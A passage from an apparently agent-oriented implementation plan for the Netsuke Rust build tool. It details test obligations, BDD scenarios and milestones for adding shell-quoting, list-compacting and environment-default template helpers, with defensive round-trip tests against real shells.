model checker would explore a strictly weaker domain than the property tests,
and the strongest available evidence — differential execution against the real
`/bin/sh` — is outside any model checker's reach. Both exclusions are choices,
not omissions.

### Obligations

**OBL-SH-ROUNDTRIP** — POSIX quoting is faithful.

- Obligation: for every `s` containing no `\0`, `\r`, or `\n`, running
  `sh -c 'printf %s ' + quote_for_recipe(Sh, s)` writes exactly `s` to stdout.
- Method: property test executing a real `/bin/sh` subprocess, `#[cfg(unix)]`.
- Rationale: this is the only method that tests the actual composition of
  Netsuke's policy layer with the third-party encoder and a real shell. A pure
  unit test would restate `shell-quote`'s own tests.
- Domain: a `proptest` string strategy deliberately biased toward shell
  metacharacters. Draw characters from an explicit alphabet containing ASCII
  letters, digits, space, tab, the single quote, the double quote, the dollar
  sign, the backtick, the backslash, the asterisk, the question mark, the
  semicolon, the ampersand, the vertical bar, the angle brackets, the round,
  square, and curly brackets, the hash, the tilde, and the exclamation mark,
  plus a slice of non-ASCII UTF-8. Lengths run from zero to twenty-four
  characters, filtered only for the three forbidden control characters.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Evidence: `cargo nextest run --test shell_filter_property_tests`. Before
  `quote_for_recipe` exists the test fails to compile; after a naive
  implementation it must fail on the first metacharacter case.
- Non-vacuity: the strategy is classified with `proptest`'s
  `prop_assume!`-free design plus an explicit assertion that, across a fixed
  seeded run, at least one generated case contained a single quote, at least
  one contained a dollar sign, and at least one contained a space — asserted by
  a companion deterministic test over a handwritten witness table so the
  property cannot pass vacuously on an all-alphanumeric sample. **Negative
  control**: a sibling `#[test]` applies a deliberately broken quoter (wrap in
  `"` only) to the witness `$HOME 'x'` through the same subprocess harness and
  asserts the harness *rejects* it. If that control ever passes, the harness is
  not measuring anything and the obligation is undischarged.

**OBL-PS-ROUNDTRIP** — PowerShell quoting is faithful.

- Obligation: for every `s` containing no `\0`, `\r`, or `\n`,
  `decode_powershell_single_quoted(quote_for_recipe(PowerShell, s)) == s`.
- Method: property test against an explicit inverse model, plus a
  `#[cfg(windows)]` real-`powershell.exe` round trip of the same shape.
- Rationale: CI for this repository runs Linux and Windows. On Linux the model
  is the only available oracle; on Windows the real interpreter discharges
  AXIOM-2 directly.
- Domain: the same string strategy as OBL-SH-ROUNDTRIP.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Evidence: the Linux run proves model conformance; the Windows CI job proves
  the model matches the interpreter.
- Non-vacuity: the model must be written as a *decoder* (strip the outer quotes,
  collapse `''`), never by calling the encoder. A negative control feeds the
  decoder a string quoted with the POSIX encoder and asserts it does **not**
  round-trip.
- Residual gap: on a non-Windows host, AXIOM-2 rests on the model. Stated here
  rather than hidden.

**OBL-ONE-WORD** — a quoted value is exactly one shell word.

- Obligation: for every admissible `s`,
  `shlex::split(&quote_for_recipe(Sh, s)?) == Some(vec![s.to_owned()])`.
- Method: property test (pure, no subprocess), `cases: 128`.
- Rationale: this is the literal claim `RM-3.14.8` makes — "optional
  `RUSTFLAGS` construction without shell parameter expansion". It is also the
  property the IR's own `shlex` guard depends on.
- Domain: as above, plus the empty string as an explicit boundary witness.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: an assertion that `shlex::split` returns two or more words for
  the *unquoted* form of at least one witness (`a b`), proving the oracle
  distinguishes quoted from unquoted.

**OBL-JOIN-SPLIT** — `shell_join` is the inverse of word splitting.

- Obligation: for every list `xs` of admissible strings,
  `shlex::split(&join_for_recipe(Sh, xs)?) == Some(xs)`.
- Method: property test, `cases: 128`.
- Domain: `prop::collection::vec(word_strategy(), 0..6)`, including the empty
  list (which must yield the empty string) and lists containing empty strings.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: classify and assert that the sample includes at least one list
  with an element containing a space and at least one with an empty element;
  negative control asserts a naive `xs.join(" ")` fails the same property.

**OBL-COMPACT** — `compact` is an order-preserving filter with a stable
predicate.

- Obligation: for every input sequence `xs`, `compact(xs)` (a) contains no
  `none`, undefined, or empty-string member; (b) is a subsequence of `xs`; (c)
  satisfies `compact(compact(xs)) == compact(xs)`; and (d) equals `xs` when
  `xs` contains no droppable member.
- Method: property test, `cases: 128`.
- Rationale: four connected invariants over an unbounded domain; a table test
  would not establish the subsequence or idempotence claims.
- Domain: a `prop_oneof!` strategy producing `Value::UNDEFINED`,
  `Value::from(())`, `Value::from("")`, `Value::from(0)`, `Value::from(false)`,
  and non-empty strings, collected into vectors of length 0..8.
- Artefact: `tests/std_filter_tests/collection_filters.rs`.
- Non-vacuity: assert that the generated sample contains at least one droppable
  and one retained member across the run, and add an explicit witness case for
  `[0, false, '', none, 'x']` yielding `[0, false, 'x']` — which fails
  immediately under a naive truthiness-based implementation. That naive
  implementation is the negative control.

**OBL-ENV-DEFAULT** — the default substitutes for absence only.

- Obligation: with an injected `EnvReader`, `env(n, default=d)` returns the
  variable's value when present (including when that value is `""`), returns
  `d` when absent, raises `UndefinedError` with the unchanged message when
  absent and `d` is omitted or `none`, and raises `InvalidOperation` with the
  unchanged message when the value is not UTF-8 *even when `d` is supplied*.
- Method: parameterized `rstest` over the finite partition, plus the two
  existing `insta` snapshots re-run unchanged.
- Rationale: the domain is a genuinely finite partition of reader outcomes
  crossed with default presence; enumeration is exhaustive.
- Domain: `{present-nonempty, present-empty, absent, not-unicode}` ×
  `{no default, default='fallback'}` — 8 cases, all enumerated at the
  `env_var_with_default` seam in `src/manifest/tests/env_function.rs`. The
  third default state, `default=none`, is *not* a distinct arm there: the
  `Option<Value>` read collapses it onto "no default" before the seam sees it
  (D4), so it is enumerated once at the template layer instead, by
  `explicit_none_default_is_equivalent_to_omitting_it`.
- Artefact: `tests/manifest_env_tests.rs` and
  `src/manifest/tests/env_function.rs`.
- Non-vacuity: the reader is an injected closure that records the key it was
  asked for, so a test asserting `default` was returned also asserts the reader
  was actually consulted — an implementation that returned `default` without
  reading fails. The unchanged `insta` snapshots are the negative control for
  diagnostic drift: any wording change fails them.

**OBL-DIALECT-TOTAL** — dialect selection is total and its error is truthful.

- Obligation: every `RecipeShell` variant maps to exactly one `ShellDialect`;
  every name in `ShellDialect::ALL` parses; every other name fails with an
  error naming the rejected value and enumerating exactly `ShellDialect::ALL`.
- Method: exhaustive parameterized test over the three-variant `RecipeShell`
  and the two-element `ALL` list, plus a test asserting the rendered error text
  contains every element of `ALL` and nothing else from a near-miss list
  (`bash`, `cmd`, `zsh`, `pwsh`).
- Rationale: the domain is finite and small; exhaustive enumeration is the
  strongest available evidence.
- Artefact: `src/shell_word.rs`'s `#[cfg(test)] mod tests`.
- Non-vacuity: the near-miss list guarantees the "enumerates exactly" assertion
  can fail; `bash` in particular is the name D3 deliberately rejects.

**OBL-NINJA-STABLE** — extracting `quote_word` changes no generated output.

- Obligation: the Ninja text generated for every existing manifest fixture is
  byte-identical before and after EP-M3.
- Method: the existing `insta` snapshot suite under `tests/snapshots/ninja/`
  and `src/snapshots/`, re-run without re-acceptance.
- Artefact: existing.
- Evidence: `make test-nextest`, then
  `git status --short src/snapshots tests/snapshots` prints nothing.
- Non-vacuity: the suite already fails when generation changes — it caught the
  3.14.7 dollar-escaping work. To confirm it is live for this refactor,
  temporarily alter `quote_word` to emit a double quote instead of a single
  quote, observe at least one snapshot fail, then revert. Record the failing
  snapshot name in `Artefacts and notes`.

**OBL-NO-ESCAPE** — quoted output survives template rendering verbatim.

- Obligation: rendering `{{ value | shell_quote(dialect='sh') }}` through the
  manifest path emits the quoter's bytes unchanged, with no HTML or XML
  escaping applied, for values containing `&`, `<`, `>`, `"`, and `'`.
- Method: parameterized `rstest` rendering through the real manifest loader,
  asserting byte equality against the quoter's direct output.
- Rationale: `src/stdlib/register.rs::register_legacy_boolean_formatter`
  installs a formatter that delegates to `escape_formatter`, which honours the
  environment's auto-escape setting. MiniJinja's default auto-escape callback
  keys off the template name's extension, and
  `src/manifest/jinja_macros/invocation.rs:63` shows the codebase already
  branches on `AutoEscape::None`. Nothing in the plan guarantees the manifest
  path is never auto-escaping, and an escaped `&amp;` inside a recipe would be
  a silent corruption of the very output this feature exists to protect.
- Domain: the five HTML-significant characters, plus one witness combining
  them.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: the assertion compares against `quote_for_recipe`'s own output,
  so it fails if either side changes. Negative control: construct an
  environment with auto-escaping forced on and assert the same template *does*
  differ, proving the test can detect escaping at all.

**OBL-CONTEXT** — quoting is only correct in unquoted argv position.

- Obligation: rendering `{{ v | shell_quote(dialect='sh') }}` in unquoted
  position yields text a POSIX shell splits into one field equal to `v`;
  rendering the same filter *inside* an existing pair of double quotes yields
  text containing the quoter's literal quote characters, which is a manifest
  defect rather than a filter defect.
- Method: parameterized `rstest` rendering a whole manifest through the real
  loader, once per position, asserting the generated Ninja `command =` text.
- Rationale: this is the plan's own worst failure mode. The first draft's
  acceptance transcript placed the interpolation inside `"..."`, where
  `printf '%s' "RUSTFLAGS=-D' warnings'"` emits the quote characters as data.
  Every other obligation exercises the filter in isolation and is structurally
  blind to it.
- Domain: the two positions, with a value containing a space and a single
  quote.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Evidence: the unquoted case matches the documented example byte for byte; the
  double-quoted case is pinned as the *documented wrong answer*, so a future
  change that silently "fixes" it fails the test and forces a decision.
- Non-vacuity: the two cases must differ. If they ever produce equal output the
  test is measuring nothing.

**OBL-JOIN-QUOTE-AGREE** — `shell_join` is `shell_quote` distributed.

- Obligation: for every dialect `d` and every list `xs` of admissible strings,
  `join_for_recipe(d, xs)?` equals the elements individually passed through
  `quote_for_recipe(d, _)?` and joined with one space.
- Method: property test, `cases: 128`, both dialects.
- Rationale: the two filters share a `dialect` argument and a documented
  promise of "the same rules". This is the only obligation that makes that a
  fact rather than a docstring, and it is what earns `dialect` its place on
  both filters.
- Artefact: `tests/shell_filter_property_tests.rs`.
- Non-vacuity: include a list whose elements need quoting and one that does
  not; a `join` implementation that quoted only non-inert elements would pass a
  weaker test and must fail this one.

**OBL-KIND-GATE** — the sequence and string gates reject what `try_iter`
accepts.

- Obligation: `compact` and `shell_join` reject a mapping, a string, `none`,
  undefined, a number, and a boolean subject, each with an error naming the
  received kind; `shell_quote` rejects every non-string subject including a
  MiniJinja object, with no `to_string` fallback.
- Method: exhaustive parameterized `rstest` over the finite `ValueKind` set.
- Rationale: D8 exists because `Value::try_iter()` silently accepts three of
  these. The domain is a small closed enumeration, so exhaustive enumeration is
  the strongest available evidence.
- Artefact: `tests/std_filter_tests/collection_filters.rs` and
  `tests/shell_filter_property_tests.rs`.
- Non-vacuity: the negative control is a `try_iter`-based implementation, which
  must pass `{{ [1,2] | compact }}` and fail `{{ 'abc' | shell_join }}` and
  `{{ my_map | compact }}` for the intended reason.

**OBL-COMPOSITION** — the filters compose with the rest of the pipeline.

- Obligation: for each `RecipeShell` variant, a manifest whose recipe
  interpolates `shell_quote`/`shell_join` output containing a single quote and
  a dollar sign renders, lowers through `interpolate_command_with_bindings`,
  and generates Ninja text that the corresponding interpreter executes to the
  intended argument vector. For a command-list recipe, the same holds after the
  entry passes through `shell_single_quote`'s `eval` payload wrapper.
- Method: integration test over the full pipeline, plus a real-interpreter
  execution assertion where the host provides one (`sh` on Unix,
  `powershell.exe` on Windows CI).
- Rationale: every other obligation tests an encoder in isolation.
  `is_valid_command_for_shell` (`src/ir/cmd_interpolate/mod.rs:226-231`) returns
  `true` unconditionally for PowerShell, so nothing downstream checks that
  path at all; and the command-list renderer's input distribution changes once
  a filter routinely emits single quotes. Neither is covered by any isolated
  test.
- Domain: three `RecipeShell` variants × {scalar command, command list}.
- Artefact: `tests/shell_filter_composition_tests.rs` (new; a top-level
  `tests/*.rs` so `tests/integration_test_wiring_tests.rs` discovers it).
- Evidence: assert the final `command =` text *and*, where an interpreter is
  available, the argument vector it actually produces.
- Non-vacuity: include a value containing `$`, so the assertion also exercises
  ADR-014's `$`-doubling; a seeded fault that drops the `$$` escaping must fail
  it.

**OBL-QUERY-SURFACE** — the manifest-query surface stays coherent.

- Obligation: under `register_manifest_query`, `compact`, `shell_quote`, and
  `shell_join` render successfully, and `env('X', default='y')` fails with the
  "disabled while rendering `netsuke help targets`" marker — not with an
  argument-count error.
- Method: parameterized `rstest` rendering each template against an environment
  built by `crate::stdlib::register_manifest_query`.
- Rationale: R8 records that nothing else enforces this; the `env` stub's arity
  changes in EP-M1 and would otherwise fail with the wrong diagnostic.
- Artefact: `tests/stdlib_manifest_query_tests.rs` (new; must be a top-level
  `tests/*.rs` so `tests/integration_test_wiring_tests.rs` discovers it).
- Non-vacuity: assert the *specific* marker text via
  `stdlib::is_manifest_query_disabled_error`-equivalent substring, not merely
  "an error occurred". Negative control: assert that the same template under
  `register_with_config` does **not** produce that marker.

### Behavioural specification (rstest-bdd)

Added to `tests/features/stdlib.feature`. The steps already exist in
`tests/bdd/steps/stdlib/` — `a stdlib workspace`,
`I render the stdlib template {template:string} without context`,
`the stdlib output equals {expected:string}`, and
`the stdlib error contains {fragment:string}` — so **no new step module is
needed** and `tests/bdd/steps/mod.rs` is untouched. Confirm each step's exact
wording in `tests/bdd/steps/stdlib/{rendering,assertions,workspace}.rs` before
writing the feature; if a needed step is missing, add it to the existing module
rather than creating a new one.

```gherkin
  Scenario: compact drops empty and null members but keeps zero
    Given a stdlib workspace
    When I render the stdlib template "{{ [0, '', none, 'x'] | compact | join(',') }}" without context
    Then the stdlib output equals "0,x"

  Scenario: shell_quote makes a metacharacter-bearing value one sh word
    Given a stdlib workspace
    When I render the stdlib template "{{ \"a b '$HOME'\" | shell_quote(dialect='sh') }}" without context
    Then the stdlib output equals "a' b '\\''$HOME'\\'"

  Scenario: shell_join quotes each element separately
    Given a stdlib workspace
    When I render the stdlib template "{{ ['-C', 'target-cpu=native', 'a b'] | shell_join(dialect='sh') }}" without context
    Then the stdlib output equals "-C target-cpu'=native' a' b'"

  Scenario: shell_quote rejects an unknown dialect and names the accepted set
    Given a stdlib workspace
    When I render the stdlib template "{{ 'x' | shell_quote(dialect='bash') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"
    And the stdlib error contains "powershell"

  Scenario: shell_quote rejects a value containing a line feed
    Given a stdlib workspace
    When I render the stdlib template "{{ 'a\nb' | shell_quote(dialect='sh') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::unquotable"

  Scenario: shell filter errors keep their code when localised
    Given a stdlib workspace
    And the localisation locale is "es-ES"
    When I render the stdlib template "{{ 'x' | shell_quote(dialect='bash') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"

  Scenario: shell_join rejects a string subject rather than quoting its characters
    Given a stdlib workspace
    When I render the stdlib template "{{ 'abc' | shell_join(dialect='sh') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"

  Scenario: shell_quote rejects a positional dialect
    Given a stdlib workspace
    When I render the stdlib template "{{ 'x' | shell_quote('sh') }}" without context
    Then the stdlib error contains "netsuke::jinja::shell::args"

```

The `env` scenarios go to `tests/features/manifest.feature` instead, against
three new fixtures under `tests/data/`. The correction is forced by the harness:
`tests/bdd/steps/stdlib/rendering.rs:101` calls `stdlib::register_with_config`
only, and `env` belongs to the *manifest* loader
(`src/manifest/registration.rs`), not to the stdlib — the stdlib's `env` is the
disabled stub. A `{{ env(...) }}` scenario written under
`When I render the stdlib template …` would fail with an unknown-function error
and prove nothing about the manifest. Confirmed during EP-M1 by running the
scenario both ways.

```gherkin
  Scenario: An absent environment variable falls back to its default
    Given the environment variable "NETSUKE_UNDEFINED_ENV" is unset
    And the manifest file "tests/data/jinja_env_default.yml" is parsed
    When the manifest is checked
    Then the first target command is "echo fallback"

  Scenario: A present environment variable ignores its default
    Given the environment variable "NETSUKE_TEST_ENV" is set to "world"
    And the manifest file "tests/data/jinja_env_present_with_default.yml" is parsed
    When the manifest is checked
    Then the first target command is "echo world"

  Scenario: A non-string default is rejected rather than stringified
    Given the environment variable "NETSUKE_TEST_ENV" is set to "world"
    And the manifest file "tests/data/jinja_env_default_non_string.yml" is parsed
    When the parsing result is checked
    Then parsing the manifest fails
    And the error message contains "netsuke::jinja::env::args"
```

The expected `sh` strings above are **verified**, not guessed. They are the
`shell-quote` crate's *fragmented* form, derived from `escape_chars` and
`Char::from` in `shell-quote-0.7.2/src/{sh,ascii}.rs` and confirmed by running
the quoted text through a real `/bin/sh`. Two consequences are
counter-intuitive and must not be "corrected" during implementation:

1. Quoting opens and closes around runs, so `a b` becomes `a' b'`, not
   `'a b'`. Alphanumerics, comma, full stop, solidus, underscore, and hyphen
   are the only characters the crate treats as inert.
2. The equals sign is **not** inert, so `target-cpu=native` becomes
   `target-cpu'=native'`. This is correct but surprising in flag-heavy output.

If an observed value differs from the above, the crate version has changed;
record that in `Surprises & discoveries` and re-derive, rather than adjusting
the implementation to match a guess.

## Plan of work

### Stage A — orient and confirm (no code changes)

Read, in order: this plan's "Context and orientation"; `AGENTS.md`;
`docs/adr-008-environment-seam-taxonomy.md`; `docs/netsuke-design.md` §§2.6,
4.4, 4.5; `docs/rfcs/0006-ansible-inspired-template-standard-library.md` §§8.9
and 13; `docs/users-guide.md:331-399` and `:458-495`;
`docs/stdlib-yaml-and-jinja-guide.md` in full;
`docs/rust-testing-with-rstest-fixtures.md`; `docs/rstest-bdd-users-guide.md`;
`docs/rust-doctest-dry-guide.md`;
`docs/reliable-testing-in-rust-via-dependency-injection.md`;
`docs/documentation-style-guide.md`; `docs/localization-styleguide.md`;
`docs/translators-guide.md` §§4-5.

Two house rules trip cold executors on exactly this shape of work, so they are
repeated here rather than left to the blanket "read `AGENTS.md`":

- `.expect()` is banned outside `#[test]` and `#[cfg(test)]` bodies, and
  `allow-expect-in-tests = true` does **not** cover shared test fixtures. The
  witness tables and negative-control helpers under OBL-SH-ROUNDTRIP and
  OBL-COMPACT are exactly where the temptation arises. Return `Result` and use
  `?`.
- Function attributes go **after** doc comments, and single-line function
  bodies are preferred where they fit.

Load these skills before writing code: `rust-router` (then whichever single
follow-on it routes to — most likely `rust-types-and-apis` for the
`ShellDialect` surface and `rust-errors` for the policy error),
`rust-unit-testing`, `proptest`, `hexagonal-architecture`,
`arch-decision-records` (for ADR-041), `en-gb-oxendict`, and `commit-message`.

Then confirm three facts against the working tree, because the plan depends on
them:

1. `grep -n "shell_escape\|shell_join\|compact" -r src/` returns nothing that is
   a Jinja helper. **Checked at `0ba6672f`: confirmed.** The only hits are
   unrelated identifiers.
2. `ls docs/adr-*.md | sort | tail -1` shows the highest ADR number, and
   `git ls-remote --heads origin` plus
   `git ls-tree -r --name-only origin/<branch> -- docs/` for each in-flight
   branch shows no collision with the number this plan picks. **Checked at
   `0ba6672f`: `adr-026` is now the highest, so the planned `adr-021` was
   already taken twice over — by the upstream fetch-policy ADR and by five
   later ones. This plan's ADR is renumbered to `adr-041` and every reference
   updated.** Re-check at rebase time: the numbering history in this repository
   includes several genuine collisions, so the number is a claim to verify, not
   a constant.

   **Re-checked at `48ea13a3`: renumbered again, to `adr-041`.** The earlier
   renumber to `adr-027` has itself gone stale:
   `docs/adr-027-command-placeholder-contract.md` exists and is an unrelated
   decision, so the number was already occupied at the moment it was chosen.
   `adr-038` is the highest in this worktree. The lesson from the previous
   renumber applies unchanged, and is why the sweep now reaches past `origin`:
   the two numbers immediately above `adr-038` are both in flight elsewhere —
   `adr-039` on `jm5/kani-change-scoped-gate` and `adr-040` on
   `6-1-1-split-rfc-0006-set-into-focused-child-rfcs-and-task` — and neither is
   on `main`. Picking the next free number from this worktree alone would have
   produced a collision. `adr-041` is free across every ref, local and remote,
   and across all 26 worktrees.
3. `cargo tree -i shell-quote` shows the `sh` feature only. **Checked at
   `0ba6672f`: confirmed** via `Cargo.toml:137`
   (`default-features = false, features = ["sh"]`).

Go/no-go: if any of the three is false, stop and escalate.

### Stage B — red tests

Each milestone below opens with its failing test. Do not write production code
before observing the intended failure.

### Stage C — implementation with verification

Milestones EP-M1 to EP-M4.

### Stage D — documentation, reconciliation, and wide validation

Milestone EP-M5.

## Milestones and plateaus

Every milestone ends with
`make check-fmt && make typecheck && make lint &&
make doc-coverage && make test`
green and a commit. No milestone introduces a compatibility alias, facade, or
deprecated entry point: the crate is pre-1.0, has no external consumers, and
every caller is in-tree, so each interface is updated together with all of its
callers (see constraint 7).

### EP-M1 — extend `src/manifest/registration.rs`, then `env(name, default=...)`

- Identifier and outcome: the `env` and `glob` registrations live in
  `src/manifest/registration.rs`; `env` accepts an optional `default` keyword
  argument, type-checked rather than stringified; the manifest-query stub
  accepts the same shape; both existing diagnostics are unchanged; a blocked
  name still fails before the reader is called.
- Requirements: `RM-3.14.8` bullet 1, `DD-4.4`, `ADR-026`.
- **The extraction is already done.** Re-verified at `0ba6672f`:
  `src/manifest/registration.rs` exists with the four planned members, and
  `src/manifest/mod.rs` is 259 lines. Do not create the module and do not
  re-move the four members. The first action is to move the `env` and `glob`
  registrations from `src/manifest/mod.rs` into that module, committing them as
  a pure move with no behaviour change and green gates so the relocation is
  reviewable on its own. Re-run
  `wc -l src/manifest/mod.rs src/manifest/registration.rs` first and confirm
  the shape still holds; this branch is not the only writer. See R9.
- Red: add the `OBL-ENV-DEFAULT` cases to `tests/manifest_env_tests.rs` and the
  unit cases to `src/manifest/tests/env_function.rs`, plus the non-string and
  undefined `default` cases from D4 and the positional case from AXIOM-4. Add a
  case proving a **blocked** name is still blocked when `default` is supplied —
  this is the ADR-026 interaction the first draft did not consider, and it is
  the one behaviour a naive implementation would get wrong by mapping absence
  to the fallback before consulting the policy. Run
  `cargo nextest run --test manifest_env_tests` and observe failures citing an
  unexpected keyword argument.
- Green: rename `env_var_with` to `env_var_with_default`, adding the `fallback`
  parameter **after** the existing `policy` parameter and keeping the policy
  evaluation first; add the `tracing::debug!(fallback_used = true, ...)` line
  (R10); add `env_default_from_kwargs` reading `Option<Value>` per D4; update
  the registration to take `Kwargs`; update the disabled stub at
  `src/stdlib/register.rs:181-184`. Add the `manifest.env.args_error` and
  `manifest.env.default_not_string` keys to all 35 catalogues. Add the
  `OBL-QUERY-SURFACE` `env` case to `tests/stdlib_manifest_query_tests.rs`.
- Refactor: keep `env_var_with_default` under 40 lines; extract the fallback
  decision into a named predicate if the match grows a third arm. Watch
  `clippy.toml`'s `too-many-arguments-threshold = 4` — prefer a small struct to
  a fifth parameter.
- Acceptance evidence: `cargo build` succeeds, proving the localization audit
  passes; `cargo nextest run --test manifest_env_tests` passes; the two `insta`
  inline snapshots pass **without** `INSTA_FORCE_UPDATE`; `git status --short`
  shows no `.snap` change;
  `wc -l src/manifest/mod.rs src/manifest/registration.rs` both report under
  400.
- Conformance check: `DD-4.4`'s "It returns an error if the variable is
  undefined and no `default` is provided, or if the variable contains invalid
  UTF-8" is satisfied exactly; RFC 0006 §6.6's no-silent-coercion rule is
  satisfied; ADR-026's ordering is preserved, which subsumes constraint 1's
  snapshot requirement because the blocked diagnostic never changes; no new
  dependency; trace links current.
- Recovery: two commits, revert either independently; `env()` returns to its
  one-argument form and the registrations return to `src/manifest/mod.rs`.
- Remaining gaps: documentation of `default=` (EP-M5).
- Compatibility decision: none required.

### EP-M2 — `compact`

- Identifier and outcome: `values | compact` is available on both registration
  surfaces and drops null, undefined, and empty-string members while preserving
  order.
- Requirements: `RM-3.14.8` bullet 3 (partial), `DD-4.5`.
- Red: add the `OBL-COMPACT` property and the explicit witness case to
  `tests/std_filter_tests/collection_filters.rs`; add the `compact` scenario to
  `tests/features/stdlib.feature`. Observe the unknown-filter failure.
- Green: implement `compact_filter` in `src/stdlib/collections.rs` beside
  `uniq_filter` and `flatten_filter`, and register it in `register_filters`.
  Non-sequence input is rejected by `ValueKind`, per D8 — **not** through
  `values.try_iter()?`, which the earlier draft of this milestone wrongly
  proposed and D8 falsifies. Accept only `ValueKind::Seq` and
  `ValueKind::Iterable`; raise `STDLIB_COLLECTIONS_COMPACT_NOT_SEQUENCE` for
  everything else, including `Map`, `String`, `None`, and `Undefined`. That key
  is already in all 35 catalogues (added with EP-M1), so no catalogue work
  remains here.
- Refactor: if `src/stdlib/collections.rs` passes 400 lines, split it into a
  directory module as described under "Interfaces and dependencies".
- Acceptance evidence: `cargo nextest run -E 'test(compact)'` passes; the naive
  truthiness implementation (negative control) fails the witness case.
- Conformance check: `DD-4.5`'s wording is matched exactly; `compact` reaches
  the manifest-query surface for free because `collections::register_filters`
  is shared — confirm by adding the `compact` case to
  `tests/stdlib_manifest_query_tests.rs`.
- Recovery: revert; the filter disappears with no other effect.
- Remaining gaps: documentation (EP-M5).
- Compatibility decision: none required.

### EP-M3 — shared recipe-shell quoting seam

- Identifier and outcome: a single `quote_word` implementation exists in
  `src/shell_word.rs`; `quote_path` delegates to it; `ShellDialect` and
  `StdlibConfig::with_recipe_shell` exist; generated Ninja is unchanged. This
  milestone registers **no** new template helper — it is a pure structural
  plateau, safe to stop at.
- Requirements: `RM-6.8.3`'s "no second quoting implementation is introduced";
  `ADR-014`.
- Red: add the `OBL-DIALECT-TOTAL` tests to `src/shell_word.rs`'s
  `#[cfg(test)] mod tests`; run the OBL-NINJA-STABLE non-vacuity check
  (deliberately break `quote_word`, observe a named snapshot fail, revert) and
  record the snapshot name.
- Green: add `src/shell_word.rs` with the body moved from `quote_path`, plus
  `ShellDialect` and `is_recipe_admissible`; reduce `quote_path` to a
  delegating call; add `RecipeShell::dialect()`; add the `dialect` field and
  `with_recipe_shell` builder to `StdlibConfig`. `src/recipe_shell.rs` **stays
  a single file** — the reviewed boundary deliberately keeps the encoder out of
  it so the module remains data-only. Do not promote it to a directory.
- Refactor: update the `//!` comment on `src/shell_word.rs` to state its
  position: a leaf below IR, Ninja, and the standard library, which both
  `src/ir/` and `src/stdlib/` may depend on.
- Acceptance evidence: `make test` passes;
  `git status --short src/snapshots tests/snapshots` prints nothing.
- Conformance check: exactly one recipe-shell quoting implementation remains;
  `src/stdlib/command/quote.rs` and `shell_single_quote` are untouched; no
  persisted or wire format changed; `RecipeShell` visibility widened only as
  far as `with_recipe_shell` requires.
- Recovery: the extraction is a pure move; revert restores the prior file.
- Remaining gaps: the filters themselves (EP-M4); the runner still injects
  `host_default()`; EP-M4 replaces it with the resolved shell in the same
  commit that registers the filters, so the divergence is never shipped.
- Compatibility decision: none required — `from_str_with_env_and_config` and
  `StdlibConfig` are pre-1.0 and every caller is in-tree.

### EP-M4 — `shell_quote` and `shell_join`, with the resolved dialect

The first draft split this in two: register the filters against
`RecipeShell::host_default()`, then plumb the resolved shell in a later
milestone. **That split is not safe to stop between.** On a Windows host with
`NETSUKE_WINDOWS_SHELL=bash`, the intermediate state quotes for PowerShell
while the recipe runs under Bash. PowerShell quoting doubles an embedded single
quote, so `a'b` becomes `'a''b'`, which a POSIX shell reads as two adjacent
quoted strings concatenated — `ab`. Syntactically valid, so `shlex::split`
accepts it and nothing complains. The build succeeds and the artefact is wrong.
See R11 and constraint 10. The two are therefore one milestone.

- Identifier and outcome: both filters are registered on both surfaces, quoting
  for the dialect of the interpreter that will actually run the recipe, with
  the new message keys present in all 35 catalogues.
- Requirements: `RM-3.14.8` bullets 2 and 3; `DD-4.5`; `RFC-0006-8.9` as
  amended by D2; `UG-WIN`.
- Red: write `tests/shell_filter_property_tests.rs` with OBL-SH-ROUNDTRIP,
  OBL-PS-ROUNDTRIP, OBL-ONE-WORD, OBL-JOIN-SPLIT, OBL-JOIN-QUOTE-AGREE,
  OBL-KIND-GATE, OBL-NO-ESCAPE and OBL-CONTEXT with their negative controls;
  write `tests/shell_filter_composition_tests.rs` with OBL-COMPOSITION; add the
  `shell_*` scenarios to `tests/features/stdlib.feature`. Add the test that
  builds a `StdlibConfig` with `.with_recipe_shell(RecipeShell::Bash)` and
  asserts `sh` quoting, asserting at the **runner** seam so it is not
  tautological. Observe compilation failure, then unknown-filter failures.
- Green: reuse the `src/shell_word.rs` module and shared quoting seam created
  by EP-M3 — EP-M4 adds the filters and the runner plumbing, it does not create
  that module; add `src/stdlib/recipe_text/`; rename
  `src/stdlib/command/quote.rs` to `child_argument.rs`; wire
  `recipe_text::register_filters` into both `register_read_only_helpers` and
  `register_query_helpers`; thread
  `ExecutionContext.graph_generation.recipe_shell` from
  `src/runner/mod.rs:130-160` through the manifest-generation path into the
  `StdlibConfig` built in `src/manifest/query.rs`; add the `clippy.toml` entry
  and its two `#[expect(...)]` sites; add the shell message keys to
  `src/localization/keys.rs` and to all 35 catalogues.
- Refactor: if a manifest-loading function would exceed four parameters, group
  them into a named struct per `AGENTS.md`. Keep every new file well under 400
  lines and give each new function a `///` comment as it is written, not
  afterwards.
- Acceptance evidence: `cargo build` succeeds, proving the localization audit
  passes; the property, composition and BDD suites pass; every negative control
  fails as designed when its broken implementation is substituted; the
  `RecipeShell::Bash` test fails when the runner plumbing is reverted while the
  config seam is kept — record that transcript.
- Conformance check: the registered names match `RFC-0006-8.9` as amended;
  exactly one `shell_quote::QuoteRefExt::quoted` call site outside the two
  `#[expect(...)]`ed ones, now enforced by Clippy; both filters are pure given
  a dialect (D6) and correctly available to manifest queries; the query-surface
  dialect divergence is pinned by an assertion rather than left latent;
  constraint 10 holds; trace links updated.
- Tolerance note: this milestone changes a public signature outside
  `src/manifest/` and `src/stdlib/config/` — the manifest-loading entry points
  gain a recipe-shell parameter. That trips tolerance 2 **by design**, and it
  is recorded here rather than discovered mid-milestone. No escalation is
  needed for this specific, foreseen change; any *further* public signature
  change still escalates.
- Recovery: revert; the filters, their keys, and the plumbing disappear
  together. Reverting only part of it would recreate R11, so revert whole.
- Remaining gaps: documentation (EP-M5).
- Compatibility decision: none required — pre-1.0, all callers in-tree, and
  the template surface is new rather than changed (constraint 7b).

### EP-M5 — documentation, ADR, and reconciliation

- Identifier and outcome: every document that described these helpers as
  planned or unimplemented now describes what ships, a worked `RUSTFLAGS`
